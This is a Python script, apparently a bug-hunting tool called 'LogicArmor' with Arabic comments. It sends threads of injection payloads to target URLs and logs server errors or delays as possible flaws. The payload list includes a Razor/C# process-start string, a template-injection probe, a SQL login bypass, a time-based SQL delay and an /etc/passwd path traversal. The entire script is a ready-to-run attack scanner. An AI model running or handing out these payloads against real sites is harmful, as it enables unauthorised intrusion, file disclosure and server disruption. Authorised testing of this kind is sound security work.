import requests
import threading
from queue import Queue
import time

# LogicArmor v1.0 - The Gray Hat Logic Hunter
# Built by: Logic Guard

class LogicArmor:
    def __init__(self, threads=20):
        self.threads = threads
        self.queue = Queue()
        # مخزن الحمولات (الأسلحة المنطقية)
        self.payloads = [
            "<html>@{ System.Diagnostics.Process.Start('calc'); }</html>", # C# Context
            "{{7*7}}",                                                  # SSTI Logic
            "admin' or '1'='1",                                         # Auth Bypass
            "'; WAITFOR DELAY '0:0:5'--",                               # Time-based SQL
            "../../../../etc/passwd"                                    # LFI Path
        ]
        self.results_file = "vulnerabilities_found.txt"

    def scan_worker(self):
        while not self.queue.empty():
            url, payload = self.queue.get()
            try:
                # إرسال الطلب مع مراقبة الوقت (Performance Monitoring)
                start_time = time.time()
                response = requests.post(url, data={'input': payload}, timeout=10)
                elapsed = time.time() - start_time

                # تحليل "الصدمة" المنطقية للسيرفر
                if response.status_code == 500 or elapsed > 4:
                    result = f"[!] ALERT: Potential Logic Flaw | URL: {url} | Payload: {payload} | Delay: {elapsed:.2f}s"
                    print(result)
                    with open(self.results_file, "a", encoding="utf-8") as f:
                        f.write(result + "\n")
                
            except requests.exceptions.RequestException:
                pass
            
            self.queue.task_done()

    def start_hunt(self, targets):
        print("🛡️ LogicArmor is initializing...")
        print(f"[*] Targets: {len(targets)} | Threads: {self.threads}")
        
        # تعبئة الطابور بالعمليات
        for url in targets:
            for p in self.payloads:
                self.queue.put((url, p))

        # إطلاق خيوط المعالجة (Threads)
        for _ in range(self.threads):
            t = threading.Thread(target=self.scan_worker)
            t.daemon = True
            t.start()

        self.queue.join()
        print("✅ Hunt completed. Check 'vulnerabilities_found.txt' for results.")

if __name__ == "__main__":
    # هنا تضع روابط الشركات (ضمن الـ Scope المسموح)
    target_list = [
        "https://example-target.com/login",
        "https://api-test-site.com/v1"
    ]
    
    scanner = LogicArmor(threads=10)
    scanner.start_hunt(target_list)
